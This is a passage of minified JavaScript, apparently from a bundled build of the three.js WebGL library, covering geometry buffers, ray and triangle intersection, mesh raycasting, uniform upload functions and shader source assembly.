r=n[e.id];return r||(e.addEventListener("dispose",a),e.isBufferGeometry?r=e:e.isGeometry&&(void 0===e._bufferGeometry&&(e._bufferGeometry=(new ii).setFromObject(t)),r=e._bufferGeometry),n[e.id]=r,i.memory.geometries++,r)},update:function(i){var n=i.index,r=i.attributes;for(var a in null!==n&&e.update(n,t.ELEMENT_ARRAY_BUFFER),r)e.update(r[a],t.ARRAY_BUFFER);var o=i.morphAttributes;for(var a in o)for(var s=o[a],l=0,c=s.length;l<c;l++)e.update(s[l],t.ARRAY_BUFFER)},getWireframeAttribute:function(i){var n=r[i.id];if(n)return n;var a,o=[],s=i.index,l=i.attributes;if(null!==s)for(var c=0,h=(a=s.array).length;c<h;c+=3){var u=a[c+0],d=a[c+1],p=a[c+2];o.push(u,d,d,p,p,u)}else for(c=0,h=(a=l.position.array).length/3-1;c<h;c+=3)u=c+0,d=c+1,p=c+2,o.push(u,d,d,p,p,u);return n=new(ti(o)>65535?Ze:$e)(o,1),e.update(n,t.ELEMENT_ARRAY_BUFFER),r[i.id]=n,n}}}function Oi(t,e,i,n){var r,a,o;this.setMode=function(t){r=t},this.setIndex=function(t){a=t.type,o=t.bytesPerElement},this.render=function(e,n){t.drawElements(r,n,a,e*o),i.update(n,r)},this.renderInstances=function(s,l,c){var h;if(n.isWebGL2)h=t;else if(null===(h=e.get("ANGLE_instanced_arrays")))return;h[n.isWebGL2?"drawElementsInstanced":"drawElementsInstancedANGLE"](r,c,a,l*o,s.maxInstancedCount),i.update(c,r,s.maxInstancedCount)}}function Ci(t){var e={frame:0,calls:0,triangles:0,points:0,lines:0};return{memory:{geometries:0,textures:0},render:e,programs:null,autoReset:!0,reset:function(){e.frame++,e.calls=0,e.triangles=0,e.points=0,e.lines=0},update:function(i,n,r){switch(r=r||1,e.calls++,n){case t.TRIANGLES:e.triangles+=r*(i/3);break;case t.TRIANGLE_STRIP:case t.TRIANGLE_FAN:e.triangles+=r*(i-2);break;case t.LINES:e.lines+=r*(i/2);break;case t.LINE_STRIP:e.lines+=r*(i-1);break;case t.LINE_LOOP:e.lines+=r*i;break;case t.POINTS:e.points+=r*i}}}}function Ri(t,e){return Math.abs(e[1])-Math.abs(t[1])}function Ii(t){var e={},i=new Float32Array(8);return{update:function(n,r,a,o){var s=n.morphTargetInfluences,l=s.length,c=e[r.id];if(void 0===c){c=[];for(var h=0;h<l;h++)c[h]=[h,0];e[r.id]=c}var u=a.morphTargets&&r.morphAttributes.position,d=a.morphNormals&&r.morphAttributes.normal;for(h=0;h<l;h++)0!==(p=c[h])[1]&&(u&&r.removeAttribute("morphTarget"+h),d&&r.removeAttribute("morphNormal"+h));for(h=0;h<l;h++)(p=c[h])[0]=h,p[1]=s[h];for(c.sort(Ri),h=0;h<8;h++){var p;if(p=c[h]){var f=p[0],m=p[1];if(m){u&&r.addAttribute("morphTarget"+h,u[f]),d&&r.addAttribute("morphNormal"+h,d[f]),i[h]=m;continue}}i[h]=0}o.getUniforms().setValue(t,"morphTargetInfluences",i)}}}function Fi(t,e){var i={};return{update:function(n){var r=e.render.frame,a=n.geometry,o=t.get(n,a);return i[o.id]!==r&&(a.isGeometry&&o.updateFromObject(n),t.update(o),i[o.id]=r),o},dispose:function(){i={}}}}function Ni(t,e,i,n,r,a,o,s,l,c){t=void 0!==t?t:[],e=void 0!==e?e:301,o=void 0!==o?o:Ut,he.call(this,t,e,i,n,r,a,o,s,l,c),this.flipY=!1}function zi(t,e,i,n){he.call(this,null),this.image={data:t,width:e,height:i,depth:n},this.magFilter=Pt,this.minFilter=Pt,this.wrapR=kt,this.generateMipmaps=!1,this.flipY=!1}bi.prototype=Object.create(li.prototype),bi.prototype.constructor=bi,bi.prototype.isShaderMaterial=!0,bi.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.fragmentShader=t.fragmentShader,this.vertexShader=t.vertexShader,this.uniforms=Te(t.uniforms),this.defines=Object.assign({},t.defines),this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.lights=t.lights,this.clipping=t.clipping,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this.morphNormals=t.morphNormals,this.extensions=t.extensions,this},bi.prototype.toJSON=function(t){var e=li.prototype.toJSON.call(this,t);for(var i in e.uniforms={},this.uniforms){var n=this.uniforms[i].value;n&&n.isTexture?e.uniforms[i]={type:"t",value:n.toJSON(t).uuid}:n&&n.isColor?e.uniforms[i]={type:"c",value:n.getHex()}:n&&n.isVector2?e.uniforms[i]={type:"v2",value:n.toArray()}:n&&n.isVector3?e.uniforms[i]={type:"v3",value:n.toArray()}:n&&n.isVector4?e.uniforms[i]={type:"v4",value:n.toArray()}:n&&n.isMatrix3?e.uniforms[i]={type:"m3",value:n.toArray()}:n&&n.isMatrix4?e.uniforms[i]={type:"m4",value:n.toArray()}:e.uniforms[i]={value:n}}Object.keys(this.defines).length>0&&(e.defines=this.defines),e.vertexShader=this.vertexShader,e.fragmentShader=this.fragmentShader;var r={};for(var a in this.extensions)!0===this.extensions[a]&&(r[a]=!0);return Object.keys(r).length>0&&(e.extensions=r),e},Object.assign(wi.prototype,{set:function(t,e){return this.origin.copy(t),this.direction.copy(e),this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.origin.copy(t.origin),this.direction.copy(t.direction),this},at:function(t,e){return void 0===e&&(e=new ee),e.copy(this.direction).multiplyScalar(t).add(this.origin)},lookAt:function(t){return this.direction.copy(t).sub(this.origin).normalize(),this},recast:function(){var t=new ee;return function(e){return this.origin.copy(this.at(e,t)),this}}(),closestPointToPoint:function(t,e){void 0===e&&(e=new ee),e.subVectors(t,this.origin);var i=e.dot(this.direction);return i<0?e.copy(this.origin):e.copy(this.direction).multiplyScalar(i).add(this.origin)},distanceToPoint:function(t){return Math.sqrt(this.distanceSqToPoint(t))},distanceSqToPoint:function(){var t=new ee;return function(e){var i=t.subVectors(e,this.origin).dot(this.direction);return i<0?this.origin.distanceToSquared(e):(t.copy(this.direction).multiplyScalar(i).add(this.origin),t.distanceToSquared(e))}}(),distanceSqToSegment:(hi=new ee,ui=new ee,di=new ee,function(t,e,i,n){hi.copy(t).add(e).multiplyScalar(.5),ui.copy(e).sub(t).normalize(),di.copy(this.origin).sub(hi);var r,a,o,s,l=.5*t.distanceTo(e),c=-this.direction.dot(ui),h=di.dot(this.direction),u=-di.dot(ui),d=di.lengthSq(),p=Math.abs(1-c*c);if(p>0)if(a=c*h-u,s=l*p,(r=c*u-h)>=0)if(a>=-s)if(a<=s){var f=1/p;o=(r*=f)*(r+c*(a*=f)+2*h)+a*(c*r+a+2*u)+d}else a=l,o=-(r=Math.max(0,-(c*a+h)))*r+a*(a+2*u)+d;else a=-l,o=-(r=Math.max(0,-(c*a+h)))*r+a*(a+2*u)+d;else a<=-s?o=-(r=Math.max(0,-(-c*l+h)))*r+(a=r>0?-l:Math.min(Math.max(-l,-u),l))*(a+2*u)+d:a<=s?(r=0,o=(a=Math.min(Math.max(-l,-u),l))*(a+2*u)+d):o=-(r=Math.max(0,-(c*l+h)))*r+(a=r>0?l:Math.min(Math.max(-l,-u),l))*(a+2*u)+d;else a=c>0?-l:l,o=-(r=Math.max(0,-(c*a+h)))*r+a*(a+2*u)+d;return i&&i.copy(this.direction).multiplyScalar(r).add(this.origin),n&&n.copy(ui).multiplyScalar(a).add(hi),o}),intersectSphere:function(){var t=new ee;return function(e,i){t.subVectors(e.center,this.origin);var n=t.dot(this.direction),r=t.dot(t)-n*n,a=e.radius*e.radius;if(r>a)return null;var o=Math.sqrt(a-r),s=n-o,l=n+o;return s<0&&l<0?null:s<0?this.at(l,i):this.at(s,i)}}(),intersectsSphere:function(t){return this.distanceSqToPoint(t.center)<=t.radius*t.radius},distanceToPlane:function(t){var e=t.normal.dot(this.direction);if(0===e)return 0===t.distanceToPoint(this.origin)?0:null;var i=-(this.origin.dot(t.normal)+t.constant)/e;return i>=0?i:null},intersectPlane:function(t,e){var i=this.distanceToPlane(t);return null===i?null:this.at(i,e)},intersectsPlane:function(t){var e=t.distanceToPoint(this.origin);return 0===e||t.normal.dot(this.direction)*e<0},intersectBox:function(t,e){var i,n,r,a,o,s,l=1/this.direction.x,c=1/this.direction.y,h=1/this.direction.z,u=this.origin;return l>=0?(i=(t.min.x-u.x)*l,n=(t.max.x-u.x)*l):(i=(t.max.x-u.x)*l,n=(t.min.x-u.x)*l),c>=0?(r=(t.min.y-u.y)*c,a=(t.max.y-u.y)*c):(r=(t.max.y-u.y)*c,a=(t.min.y-u.y)*c),i>a||r>n?null:((r>i||i!=i)&&(i=r),(a<n||n!=n)&&(n=a),h>=0?(o=(t.min.z-u.z)*h,s=(t.max.z-u.z)*h):(o=(t.max.z-u.z)*h,s=(t.min.z-u.z)*h),i>s||o>n?null:((o>i||i!=i)&&(i=o),(s<n||n!=n)&&(n=s),n<0?null:this.at(i>=0?i:n,e)))},intersectsBox:(ci=new ee,function(t){return null!==this.intersectBox(t,ci)}),intersectTriangle:function(){var t=new ee,e=new ee,i=new ee,n=new ee;return function(r,a,o,s,l){e.subVectors(a,r),i.subVectors(o,r),n.crossVectors(e,i);var c,h=this.direction.dot(n);if(h>0){if(s)return null;c=1}else{if(!(h<0))return null;c=-1,h=-h}t.subVectors(this.origin,r);var u=c*this.direction.dot(i.crossVectors(t,i));if(u<0)return null;var d=c*this.direction.dot(e.cross(t));if(d<0)return null;if(u+d>h)return null;var p=-c*t.dot(n);return p<0?null:this.at(p/h,l)}}(),applyMatrix4:function(t){return this.origin.applyMatrix4(t),this.direction.transformDirection(t),this},equals:function(t){return t.origin.equals(this.origin)&&t.direction.equals(this.direction)}}),Object.assign(Ti,{getNormal:(fi=new ee,function(t,e,i,n){void 0===n&&(n=new ee),n.subVectors(i,e),fi.subVectors(t,e),n.cross(fi);var r=n.lengthSq();return r>0?n.multiplyScalar(1/Math.sqrt(r)):n.set(0,0,0)}),getBarycoord:function(){var t=new ee,e=new ee,i=new ee;return function(n,r,a,o,s){t.subVectors(o,r),e.subVectors(a,r),i.subVectors(n,r);var l=t.dot(t),c=t.dot(e),h=t.dot(i),u=e.dot(e),d=e.dot(i),p=l*u-c*c;if(void 0===s&&(s=new ee),0===p)return s.set(-2,-1,-1);var f=1/p,m=(u*h-c*d)*f,_=(l*d-c*h)*f;return s.set(1-m-_,_,m)}}(),containsPoint:function(){var t=new ee;return function(e,i,n,r){return Ti.getBarycoord(e,i,n,r,t),t.x>=0&&t.y>=0&&t.x+t.y<=1}}(),getUV:(pi=new ee,function(t,e,i,n,r,a,o,s){return this.getBarycoord(t,e,i,n,pi),s.set(0,0),s.addScaledVector(r,pi.x),s.addScaledVector(a,pi.y),s.addScaledVector(o,pi.z),s})}),Object.assign(Ti.prototype,{set:function(t,e,i){return this.a.copy(t),this.b.copy(e),this.c.copy(i),this},setFromPointsAndIndices:function(t,e,i,n){return this.a.copy(t[e]),this.b.copy(t[i]),this.c.copy(t[n]),this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.a.copy(t.a),this.b.copy(t.b),this.c.copy(t.c),this},getArea:function(){var t=new ee,e=new ee;return function(){return t.subVectors(this.c,this.b),e.subVectors(this.a,this.b),.5*t.cross(e).length()}}(),getMidpoint:function(t){return void 0===t&&(t=new ee),t.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},getNormal:function(t){return Ti.getNormal(this.a,this.b,this.c,t)},getPlane:function(t){return void 0===t&&(t=new ee),t.setFromCoplanarPoints(this.a,this.b,this.c)},getBarycoord:function(t,e){return Ti.getBarycoord(t,this.a,this.b,this.c,e)},containsPoint:function(t){return Ti.containsPoint(t,this.a,this.b,this.c)},getUV:function(t,e,i,n,r){return Ti.getUV(t,this.a,this.b,this.c,e,i,n,r)},intersectsBox:function(t){return t.intersectsTriangle(this)},closestPointToPoint:(mi=new ee,_i=new ee,gi=new ee,vi=new ee,yi=new ee,xi=new ee,function(t,e){void 0===e&&(e=new ee);var i,n,r=this.a,a=this.b,o=this.c;mi.subVectors(a,r),_i.subVectors(o,r),vi.subVectors(t,r);var s=mi.dot(vi),l=_i.dot(vi);if(s<=0&&l<=0)return e.copy(r);yi.subVectors(t,a);var c=mi.dot(yi),h=_i.dot(yi);if(c>=0&&h<=c)return e.copy(a);var u=s*h-c*l;if(u<=0&&s>=0&&c<=0)return i=s/(s-c),e.copy(r).addScaledVector(mi,i);xi.subVectors(t,o);var d=mi.dot(xi),p=_i.dot(xi);if(p>=0&&d<=p)return e.copy(o);var f=d*l-s*p;if(f<=0&&l>=0&&p<=0)return n=l/(l-p),e.copy(r).addScaledVector(_i,n);var m=c*p-d*h;if(m<=0&&h-c>=0&&d-p>=0)return gi.subVectors(o,a),n=(h-c)/(h-c+(d-p)),e.copy(a).addScaledVector(gi,n);var _=1/(m+f+u);return i=f*_,n=u*_,e.copy(r).addScaledVector(mi,i).addScaledVector(_i,n)}),equals:function(t){return t.a.equals(this.a)&&t.b.equals(this.b)&&t.c.equals(this.c)}}),Si.prototype=Object.create(li.prototype),Si.prototype.constructor=Si,Si.prototype.isMeshBasicMaterial=!0,Si.prototype.copy=function(t){return li.prototype.copy.call(this,t),this.color.copy(t.color),this.map=t.map,this.lightMap=t.lightMap,this.lightMapIntensity=t.lightMapIntensity,this.aoMap=t.aoMap,this.aoMapIntensity=t.aoMapIntensity,this.specularMap=t.specularMap,this.alphaMap=t.alphaMap,this.envMap=t.envMap,this.combine=t.combine,this.reflectivity=t.reflectivity,this.refractionRatio=t.refractionRatio,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.wireframeLinecap=t.wireframeLinecap,this.wireframeLinejoin=t.wireframeLinejoin,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this},Mi.prototype=Object.assign(Object.create(De.prototype),{constructor:Mi,isMesh:!0,setDrawMode:function(t){this.drawMode=t},copy:function(t){return De.prototype.copy.call(this,t),this.drawMode=t.drawMode,void 0!==t.morphTargetInfluences&&(this.morphTargetInfluences=t.morphTargetInfluences.slice()),void 0!==t.morphTargetDictionary&&(this.morphTargetDictionary=Object.assign({},t.morphTargetDictionary)),this},updateMorphTargets:function(){var t,e,i,n=this.geometry;if(n.isBufferGeometry){var r=n.morphAttributes,a=Object.keys(r);if(a.length>0){var o=r[a[0]];if(void 0!==o)for(this.morphTargetInfluences=[],this.morphTargetDictionary={},t=0,e=o.length;t<e;t++)i=o[t].name||String(t),this.morphTargetInfluences.push(0),this.morphTargetDictionary[i]=t}}else{var s=n.morphTargets;void 0!==s&&s.length}},raycast:function(){var t=new Qt,e=new wi,i=new pe,n=new ee,r=new ee,a=new ee,o=new ee,s=new ee,l=new ee,c=new Jt,h=new Jt,u=new Jt,d=new ee,p=new ee;function f(t,e,i,n,r,a,o,s){if(null===(1===e.side?n.intersectTriangle(o,a,r,!0,s):n.intersectTriangle(r,a,o,2!==e.side,s)))return null;p.copy(s),p.applyMatrix4(t.matrixWorld);var l=i.ray.origin.distanceTo(p);return l<i.near||l>i.far?null:{distance:l,point:p.clone(),object:t}}function m(t,e,i,o,s,l,p,m,_){n.fromBufferAttribute(s,p),r.fromBufferAttribute(s,m),a.fromBufferAttribute(s,_);var g=f(t,e,i,o,n,r,a,d);if(g){l&&(c.fromBufferAttribute(l,p),h.fromBufferAttribute(l,m),u.fromBufferAttribute(l,_),g.uv=Ti.getUV(d,n,r,a,c,h,u,new Jt));var v=new Pe(p,m,_);Ti.getNormal(n,r,a,v.normal),g.face=v}return g}return function(p,_){var g,v=this.geometry,y=this.material,x=this.matrixWorld;if(void 0!==y&&(null===v.boundingSphere&&v.computeBoundingSphere(),i.copy(v.boundingSphere),i.applyMatrix4(x),!1!==p.ray.intersectsSphere(i)&&(t.getInverse(x),e.copy(p.ray).applyMatrix4(t),null===v.boundingBox||!1!==e.intersectsBox(v.boundingBox))))if(v.isBufferGeometry){var b,w,T,S,M,E,L,k,A,P=v.index,O=v.attributes.position,C=v.attributes.uv,R=v.groups,I=v.drawRange;if(null!==P)if(Array.isArray(y))for(S=0,E=R.length;S<E;S++)for(A=y[(k=R[S]).materialIndex],M=Math.max(k.start,I.start),L=Math.min(k.start+k.count,I.start+I.count);M<L;M+=3)b=P.getX(M),w=P.getX(M+1),T=P.getX(M+2),(g=m(this,A,p,e,O,C,b,w,T))&&(g.faceIndex=Math.floor(M/3),g.face.materialIndex=k.materialIndex,_.push(g));else for(S=Math.max(0,I.start),E=Math.min(P.count,I.start+I.count);S<E;S+=3)b=P.getX(S),w=P.getX(S+1),T=P.getX(S+2),(g=m(this,y,p,e,O,C,b,w,T))&&(g.faceIndex=Math.floor(S/3),_.push(g));else if(void 0!==O)if(Array.isArray(y))for(S=0,E=R.length;S<E;S++)for(A=y[(k=R[S]).materialIndex],M=Math.max(k.start,I.start),L=Math.min(k.start+k.count,I.start+I.count);M<L;M+=3)(g=m(this,A,p,e,O,C,b=M,w=M+1,T=M+2))&&(g.faceIndex=Math.floor(M/3),g.face.materialIndex=k.materialIndex,_.push(g));else for(S=Math.max(0,I.start),E=Math.min(O.count,I.start+I.count);S<E;S+=3)(g=m(this,y,p,e,O,C,b=S,w=S+1,T=S+2))&&(g.faceIndex=Math.floor(S/3),_.push(g))}else if(v.isGeometry){var F,N,z,D,G=Array.isArray(y),U=v.vertices,B=v.faces,j=v.faceVertexUvs[0];j.length>0&&(D=j);for(var W=0,H=B.length;W<H;W++){var V=B[W],Y=G?y[V.materialIndex]:y;if(void 0!==Y){if(F=U[V.a],N=U[V.b],z=U[V.c],!0===Y.morphTargets){var X=v.morphTargets,$=this.morphTargetInfluences;n.set(0,0,0),r.set(0,0,0),a.set(0,0,0);for(var q=0,Z=X.length;q<Z;q++){var K=$[q];if(0!==K){var J=X[q].vertices;n.addScaledVector(o.subVectors(J[V.a],F),K),r.addScaledVector(s.subVectors(J[V.b],N),K),a.addScaledVector(l.subVectors(J[V.c],z),K)}}n.add(F),r.add(N),a.add(z),F=n,N=r,z=a}if(g=f(this,Y,p,e,F,N,z,d)){if(D&&D[W]){var Q=D[W];c.copy(Q[0]),h.copy(Q[1]),u.copy(Q[2]),g.uv=Ti.getUV(d,F,N,z,c,h,u,new Jt)}g.face=V,g.faceIndex=W,_.push(g)}}}}}}(),clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}}),i(29),Ni.prototype=Object.create(he.prototype),Ni.prototype.constructor=Ni,Ni.prototype.isCubeTexture=!0,Object.defineProperty(Ni.prototype,"images",{get:function(){return this.image},set:function(t){this.image=t}}),zi.prototype=Object.create(he.prototype),zi.prototype.constructor=zi,zi.prototype.isDataTexture3D=!0;var Di=new he,Gi=new zi,Ui=new Ni;function Bi(){this.seq=[],this.map={}}var ji=[],Wi=[],Hi=new Float32Array(16),Vi=new Float32Array(9),Yi=new Float32Array(4);function Xi(t,e,i){var n=t[0];if(n<=0||n>0)return t;var r=e*i,a=ji[r];if(void 0===a&&(a=new Float32Array(r),ji[r]=a),0!==e){n.toArray(a,0);for(var o=1,s=0;o!==e;++o)s+=i,t[o].toArray(a,s)}return a}function $i(t,e){if(t.length!==e.length)return!1;for(var i=0,n=t.length;i<n;i++)if(t[i]!==e[i])return!1;return!0}function qi(t,e){for(var i=0,n=e.length;i<n;i++)t[i]=e[i]}function Zi(t,e){var i=Wi[e];void 0===i&&(i=new Int32Array(e),Wi[e]=i);for(var n=0;n!==e;++n)i[n]=t.allocTextureUnit();return i}function Ki(t,e){var i=this.cache;i[0]!==e&&(t.uniform1f(this.addr,e),i[0]=e)}function Ji(t,e){var i=this.cache;i[0]!==e&&(t.uniform1i(this.addr,e),i[0]=e)}function Qi(t,e){var i=this.cache;if(void 0!==e.x)i[0]===e.x&&i[1]===e.y||(t.uniform2f(this.addr,e.x,e.y),i[0]=e.x,i[1]=e.y);else{if($i(i,e))return;t.uniform2fv(this.addr,e),qi(i,e)}}function tn(t,e){var i=this.cache;if(void 0!==e.x)i[0]===e.x&&i[1]===e.y&&i[2]===e.z||(t.uniform3f(this.addr,e.x,e.y,e.z),i[0]=e.x,i[1]=e.y,i[2]=e.z);else if(void 0!==e.r)i[0]===e.r&&i[1]===e.g&&i[2]===e.b||(t.uniform3f(this.addr,e.r,e.g,e.b),i[0]=e.r,i[1]=e.g,i[2]=e.b);else{if($i(i,e))return;t.uniform3fv(this.addr,e),qi(i,e)}}function en(t,e){var i=this.cache;if(void 0!==e.x)i[0]===e.x&&i[1]===e.y&&i[2]===e.z&&i[3]===e.w||(t.uniform4f(this.addr,e.x,e.y,e.z,e.w),i[0]=e.x,i[1]=e.y,i[2]=e.z,i[3]=e.w);else{if($i(i,e))return;t.uniform4fv(this.addr,e),qi(i,e)}}function nn(t,e){var i=this.cache,n=e.elements;if(void 0===n){if($i(i,e))return;t.uniformMatrix2fv(this.addr,!1,e),qi(i,e)}else{if($i(i,n))return;Yi.set(n),t.uniformMatrix2fv(this.addr,!1,Yi),qi(i,n)}}function rn(t,e){var i=this.cache,n=e.elements;if(void 0===n){if($i(i,e))return;t.uniformMatrix3fv(this.addr,!1,e),qi(i,e)}else{if($i(i,n))return;Vi.set(n),t.uniformMatrix3fv(this.addr,!1,Vi),qi(i,n)}}function an(t,e){var i=this.cache,n=e.elements;if(void 0===n){if($i(i,e))return;t.uniformMatrix4fv(this.addr,!1,e),qi(i,e)}else{if($i(i,n))return;Hi.set(n),t.uniformMatrix4fv(this.addr,!1,Hi),qi(i,n)}}function on(t,e,i){var n=this.cache,r=i.allocTextureUnit();n[0]!==r&&(t.uniform1i(this.addr,r),n[0]=r),i.setTexture2D(e||Di,r)}function sn(t,e,i){var n=this.cache,r=i.allocTextureUnit();n[0]!==r&&(t.uniform1i(this.addr,r),n[0]=r),i.setTexture3D(e||Gi,r)}function ln(t,e,i){var n=this.cache,r=i.allocTextureUnit();n[0]!==r&&(t.uniform1i(this.addr,r),n[0]=r),i.setTextureCube(e||Ui,r)}function cn(t,e){var i=this.cache;$i(i,e)||(t.uniform2iv(this.addr,e),qi(i,e))}function hn(t,e){var i=this.cache;$i(i,e)||(t.uniform3iv(this.addr,e),qi(i,e))}function un(t,e){var i=this.cache;$i(i,e)||(t.uniform4iv(this.addr,e),qi(i,e))}function dn(t,e){var i=this.cache;$i(i,e)||(t.uniform1fv(this.addr,e),qi(i,e))}function pn(t,e){var i=this.cache;$i(i,e)||(t.uniform1iv(this.addr,e),qi(i,e))}function fn(t,e){var i=this.cache,n=Xi(e,this.size,2);$i(i,n)||(t.uniform2fv(this.addr,n),this.updateCache(n))}function mn(t,e){var i=this.cache,n=Xi(e,this.size,3);$i(i,n)||(t.uniform3fv(this.addr,n),this.updateCache(n))}function _n(t,e){var i=this.cache,n=Xi(e,this.size,4);$i(i,n)||(t.uniform4fv(this.addr,n),this.updateCache(n))}function gn(t,e){var i=this.cache,n=Xi(e,this.size,4);$i(i,n)||(t.uniformMatrix2fv(this.addr,!1,n),this.updateCache(n))}function vn(t,e){var i=this.cache,n=Xi(e,this.size,9);$i(i,n)||(t.uniformMatrix3fv(this.addr,!1,n),this.updateCache(n))}function yn(t,e){var i=this.cache,n=Xi(e,this.size,16);$i(i,n)||(t.uniformMatrix4fv(this.addr,!1,n),this.updateCache(n))}function xn(t,e,i){var n=this.cache,r=e.length,a=Zi(i,r);!1===$i(n,a)&&(t.uniform1iv(this.addr,a),qi(n,a));for(var o=0;o!==r;++o)i.setTexture2D(e[o]||Di,a[o])}function bn(t,e,i){var n=this.cache,r=e.length,a=Zi(i,r);!1===$i(n,a)&&(t.uniform1iv(this.addr,a),qi(n,a));for(var o=0;o!==r;++o)i.setTextureCube(e[o]||Ui,a[o])}function wn(t,e,i){this.id=t,this.addr=i,this.cache=[],this.setValue=function(t){switch(t){case 5126:return Ki;case 35664:return Qi;case 35665:return tn;case 35666:return en;case 35674:return nn;case 35675:return rn;case 35676:return an;case 35678:case 36198:return on;case 35679:return sn;case 35680:return ln;case 5124:case 35670:return Ji;case 35667:case 35671:return cn;case 35668:case 35672:return hn;case 35669:case 35673:return un}}(e.type)}function Tn(t,e,i){this.id=t,this.addr=i,this.cache=[],this.size=e.size,this.setValue=function(t){switch(t){case 5126:return dn;case 35664:return fn;case 35665:return mn;case 35666:return _n;case 35674:return gn;case 35675:return vn;case 35676:return yn;case 35678:return xn;case 35680:return bn;case 5124:case 35670:return pn;case 35667:case 35671:return cn;case 35668:case 35672:return hn;case 35669:case 35673:return un}}(e.type)}function Sn(t){this.id=t,Bi.call(this)}Tn.prototype.updateCache=function(t){var e=this.cache;t instanceof Float32Array&&e.length!==t.length&&(this.cache=new Float32Array(t.length)),qi(e,t)},Sn.prototype.setValue=function(t,e,i){for(var n=this.seq,r=0,a=n.length;r!==a;++r){var o=n[r];o.setValue(t,e[o.id],i)}};var Mn=/([\w\d_]+)(\])?(\[|\.)?/g;function En(t,e){t.seq.push(e),t.map[e.id]=e}function Ln(t,e,i){var n=t.name,r=n.length;for(Mn.lastIndex=0;;){var a=Mn.exec(n),o=Mn.lastIndex,s=a[1],l="]"===a[2],c=a[3];if(l&&(s|=0),void 0===c||"["===c&&o+2===r){En(i,void 0===c?new wn(s,t,e):new Tn(s,t,e));break}var h=i.map[s];void 0===h&&En(i,h=new Sn(s)),i=h}}function kn(t,e,i){Bi.call(this),this.renderer=i;for(var n=t.getProgramParameter(e,t.ACTIVE_UNIFORMS),r=0;r<n;++r){var a=t.getActiveUniform(e,r);Ln(a,t.getUniformLocation(e,a.name),this)}}function An(t,e,i){var n=t.createShader(e);return t.shaderSource(n,i),t.compileShader(n),t.getShaderParameter(n,t.COMPILE_STATUS),t.getShaderInfoLog(n),n}kn.prototype.setValue=function(t,e,i){var n=this.map[e];void 0!==n&&n.setValue(t,i,this.renderer)},kn.prototype.setOptional=function(t,e,i){var n=e[i];void 0!==n&&this.setValue(t,i,n)},kn.upload=function(t,e,i,n){for(var r=0,a=e.length;r!==a;++r){var o=e[r],s=i[o.id];!1!==s.needsUpdate&&o.setValue(t,s.value,n)}},kn.seqWithValue=function(t,e){for(var i=[],n=0,r=t.length;n!==r;++n){var a=t[n];a.id in e&&i.push(a)}return i};var Pn=0;function On(t){switch(t){case $t:return["Linear","( value )"];case qt:return["sRGB","( value )"];case 3002:return["RGBE","( value )"];case 3004:return["RGBM","( value, 7.0 )"];case 3005:return["RGBM","( value, 16.0 )"];case 3006:return["RGBD","( value, 256.0 )"];case 3007:return["Gamma","( value, float( GAMMA_FACTOR ) )"];default:throw new Error("unsupported encoding: "+t)}}function Cn(t,e){var i=On(e);return"vec4 "+t+"( vec4 value ) { return "+i[0]+"ToLinear"+i[1]+"; }"}function Rn(t,e){var i;switch(e){case 1:i="Linear";break;case 2:i="Reinhard";break;case 3:i="Uncharted2";break;case 4:i="OptimizedCineon";break;case 5:i="ACESFilmic";break;default:throw new Error("unsupported toneMapping: "+e)}return"vec3 "+t+"( vec3 color ) { return "+i+"ToneMapping( color ); }"}function In(t){return""!==t}function Fn(t,e){return t.replace(/NUM_DIR_LIGHTS/g,e.numDirLights).replace(/NUM_SPOT_LIGHTS/g,e.numSpotLights).replace(/NUM_RECT_AREA_LIGHTS/g,e.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,e.numPointLights).replace(/NUM_HEMI_LIGHTS/g,e.numHemiLights)}function Nn(t,e){return t.replace(/NUM_CLIPPING_PLANES/g,e.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,e.numClippingPlanes-e.numClipIntersection)}function zn(t){return t.replace(/^[ \t]*#include +<([\w\d./]+)>/gm,(function(t,e){var i=ye[e];if(void 0===i)throw new Error("Can not resolve #include <"+e+">");return zn(i)}))}function Dn(t){return t.replace(/#pragma unroll_loop[\s]+?for \( int i \= (\d+)\; i < (\d+)\; i \+\+ \) \{([\s\S]+?)(?=\})\}/g,(function(t,e,i,n){for(var r="",a=parseInt(e);a<parseInt(i);a++)r+=n.replace(/\[ i \]/g,"[ "+a+" ]");return r}))}function Gn(t,e,i,n,r,a,o){var s=t.context,l=n.defines,c=r.vertexShader,h=r.fragmentShader,u="SHADOWMAP_TYPE_BASIC";1===a.shadowMapType?u="SHADOWMAP_TYPE_PCF":2===a.shadowMapType&&(u="SHADOWMAP_TYPE_PCF_SOFT");var d="ENVMAP_TYPE_CUBE",p="ENVMAP_MODE_REFLECTION",f="ENVMAP_BLENDING_MULTIPLY";if(a.envMap){switch(n.envMap.mapping){case 301:case 302:d="ENVMAP_TYPE_CUBE";break;case 306:case 307:d="ENVMAP_TYPE_CUBE_UV";break;case 303:case 304:d="ENVMAP_TYPE_EQUIREC";break;case 305:d="ENVMAP_TYPE_SPHERE"}switch(n.envMap.mapping){case 302:case 304:p="ENVMAP_MODE_REFRACTION"}switch(n.combine){case 0:f="ENVMAP_BLENDING_MULTIPLY";break;case 1:f="ENVMAP_BLENDING_MIX";break;case 2:f="ENVMAP_BLENDING_ADD"}}var m,_,g,v,y=t.gammaFactor>0?t.gammaFactor:1,x=o.isWebGL2?"":function(t,e,i){return[(t=t||{}).derivatives||e.envMapCubeUV||e.bumpMap||e.normalMap&&!e.objectSpaceNormalMap||e.flatShading?"#extension GL_OES_standard_derivatives : enable":"",(t.fragDepth||e.logarithmicDepthBuffer)&&i.get("EXT_frag_depth")?"#extension GL_EXT_frag_depth : enable":"",t.drawBuffers&&i.get("WEBGL_draw_buffers")?"#extension GL_EXT_draw_buffers : require":"",(t.shaderTextureLOD||e.envMap)&&i.get("EXT_shader_texture_lod")?"#extension GL_EXT_shader_texture_lod : enable":""].filter(In).join("\n")}(n.extensions,a,e),b=function(t){var e=[];for(var i in t){var n=t[i];!1!==n&&e.push("#define "+i+" "+n)}return 